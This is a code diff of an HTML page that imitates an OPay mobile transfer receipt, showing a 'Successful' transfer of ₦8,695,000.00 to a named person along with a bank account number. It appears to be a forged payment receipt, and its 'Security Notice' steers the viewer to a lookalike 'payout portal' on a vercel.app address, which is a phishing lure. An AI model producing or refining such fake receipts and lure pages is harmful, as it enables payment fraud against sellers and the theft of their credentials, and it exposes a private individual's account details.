@@ -5,71 +5,70 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Transaction Receipt</title>
     <style>
-        /* 🎨 Core Mobile Styling */
-        body { font-family: -apple-system, system-ui, sans-serif; background: #f7f8f9; margin: 0; padding: 15px; display: flex; justify-content: center; }
-        .app-container { background: #fff; width: 100%; max-width: 380px; border-radius: 24px; padding: 20px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+        /* 🎨 CSS: Native Mobile Look & Feel */
+        body { font-family: -apple-system, system-ui, sans-serif; background: #F7F8F9; margin: 0; padding: 15px; display: flex; justify-content: center; }
+        .receipt-container { background: #fff; width: 100%; max-width: 380px; border-radius: 24px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
 
-        /* 🟣 Top Branding & Success State */
-        .brand-icon { width: 44px; height: 44px; background: #40196D; color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 12px; font-weight: bold; }
-        .status-msg { color: #00B55A; font-weight: 700; text-align: center; margin-bottom: 4px; }
-        .amount { font-size: 28px; font-weight: 800; text-align: center; margin-bottom: 24px; }
+        /* 🔵 Header Section */
+        .op-logo { background: #00457C; color: #FFCC00; width: 44px; height: 44px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 12px; font-weight: 800; font-size: 16px; }
+        .transfer-txt { text-align: center; font-size: 12px; color: #888; margin-bottom: 4px; }
+        .amount { font-size: 30px; font-weight: 800; text-align: center; margin: 8px 0; color: #000; }
+        .status-tag { color: #00B55A; font-weight: 700; text-align: center; font-size: 14px; margin-bottom: 20px; }
 
-        /* 🛣️ All-Green Tracker (From OPay Screenshot) */
-        .tracker { display: flex; align-items: center; justify-content: space-between; margin: 20px 0 40px; padding: 0 10px; }
-        .step { position: relative; }
-        .dot { width: 18px; height: 18px; background: #00B55A; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-size: 10px; }
-        .line { flex: 1; height: 2px; background: #00B55A; margin: 0 5px; }
-        .label-ts { position: absolute; top: 22px; left: 50%; transform: translateX(-50%); font-size: 9px; color: #888; white-space: nowrap; text-align: center; }
+        /* ⚠️ The Security Notice Box */
+        .security-box { background: #F8F9FA; border: 1px solid #EEEEEE; border-radius: 12px; padding: 15px; margin-bottom: 25px; font-size: 11px; color: #666; line-height: 1.5; text-align: left; }
+        .static-url { color: #00B55A; font-weight: 700; display: block; margin-top: 6px; word-break: break-all; }
 
-        /* 📋 Transaction Details Box */
-        .details-box { border-top: 1px solid #f0f0f0; padding-top: 20px; text-align: left; }
-        .row { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 13px; line-height: 1.4; }
-        .lbl { color: #8A8A8E; }
-        .val { color: #1C1C1E; font-weight: 600; text-align: right; }
+        /* 📋 The "Transaction Details" Section */
+        .details-header { font-size: 14px; font-weight: 700; color: #1C1C1E; margin-bottom: 15px; text-align: left; }
+        .details-grid { border-top: 1px solid #F2F2F2; padding-top: 15px; }
+        .detail-row { display: flex; justify-content: space-between; margin-bottom: 14px; font-size: 13px; line-height: 1.4; }
+        .detail-label { color: #8A8A8E; flex: 1; }
+        .detail-value { color: #1C1C1E; font-weight: 600; text-align: right; flex: 2; }
 
-        /* ⚠️ The Non-Clickable Security Notice */
-        .notice-box { background: #F8F9FA; border: 1px solid #EEE; border-radius: 12px; padding: 15px; margin: 20px 0; font-size: 11px; text-align: left; color: #555; }
-        .static-url { color: #00B55A; font-weight: 700; display: block; margin-top: 6px; }
-
-        /* 🟢 Action Bar (Static Buttons) */
-        .action-bar { display: flex; gap: 10px; margin-top: 20px; border-top: 1px solid #f0f0f0; padding-top: 20px; }
-        .btn { flex: 1; padding: 12px; border-radius: 25px; font-size: 14px; font-weight: 700; text-align: center; }
-        .report { background: #F0FAF5; color: #00B55A; }
-        .share { background: #00B55A; color: white; }
+        /* 🟢 Bottom Action Buttons */
+        .action-footer { display: flex; gap: 12px; margin-top: 25px; border-top: 1px solid #F2F2F2; padding-top: 20px; }
+        .btn-static { flex: 1; padding: 13px; border-radius: 25px; text-align: center; font-weight: 700; font-size: 14px; }
+        .btn-report { background: #F0FAF5; color: #00B55A; }
+        .btn-share { background: #00B55A; color: white; }
     </style>
 </head>
 <body>
 
-<div class="app-container">
-    <div class="brand-icon">K</div>
-    <div class="status-msg">Successful</div>
+<div class="receipt-container">
+    <div class="op-logo">OP</div>
+    <div class="transfer-txt">Transfer to LAWRENCE TEMILOLUWA OLUWASEGUN</div>
     <div class="amount">₦8,695,000.00</div>
+    <div class="status-tag">Successful</div>
 
-    <div class="tracker">
-        <div class="step"><div class="dot">✔</div><div class="label-ts">Payment<br>11:40:03</div></div>
-        <div class="line"></div>
-        <div class="step"><div class="dot">✔</div><div class="label-ts">Processing<br>11:40:20</div></div>
-        <div class="line"></div>
-        <div class="step"><div class="dot">✔</div><div class="label-ts">Received<br>11:40:38</div></div>
-    </div>
-
-    <div class="details-box">
-        <div class="row"><span class="lbl">Recipient</span><span class="val">LAWRENCE TEMILOLUWA OLUWASEGUN</span></div>
-        <div class="row"><span class="lbl">Bank</span><span class="val">Kuda Bank</span></div>
-        <div class="row"><span class="lbl">Account Number</span><span class="val">2037503064</span></div>
-        <div class="row"><span class="lbl">Transaction No.</span><span class="val">2674375006120252</span></div>
-        <div class="row"><span class="lbl">Payment Method</span><span class="val">OWealth ></span></div>
-        <div class="row"><span class="lbl">Transaction Date</span><span class="val">Feb 15 2026, 11:40:38 AM</span></div>
-    </div>
-
-    <div class="notice-box">
-        <strong>Security Notice:</strong> High-volume transfers may require manual settlement. If funds do not reflect within 5 minutes, please verify the credit status:
+    <div class="security-box">
+        <strong>Security Notice:</strong> Due to the large transaction volume, the recipient bank may require manual settlement authorization. If funds are not reflected within 5 minutes, please visit the OPay Merchant Payout portal to verify the credit:
         <span class="static-url">https://secure-payout-portal-k.vercel.app/</span>
     </div>
 
-    <div class="action-bar">
-        <div class="btn report">Report Issue</div>
-        <div class="btn share">Share Receipt</div>
+    <div class="details-header">Transaction Details</div>
+    <div class="details-grid">
+        <div class="detail-row">
+            <span class="detail-label">Recipient Details</span>
+            <span class="detail-value">LAWRENCE TEMILOLUWA OLUWASEGUN<br>Kuda Bank | 2037503064</span>
+        </div>
+        <div class="detail-row">
+            <span class="detail-label">Transaction No.</span>
+            <span class="detail-value">260541204414213</span>
+        </div>
+        <div class="detail-row">
+            <span class="detail-label">Payment Method</span>
+            <span class="detail-value">OWealth &gt;</span>
+        </div>
+        <div class="detail-row">
+            <span class="detail-label">Transaction Date</span>
+            <span class="detail-value">Feb 21 2026, 08:38 AM</span>
+        </div>
+    </div>
+
+    <div class="action-footer">
+        <div class="btn-static btn-report">Report Issue</div>
+        <div class="btn-static btn-share">Share Receipt</div>
     </div>
 </div>
 
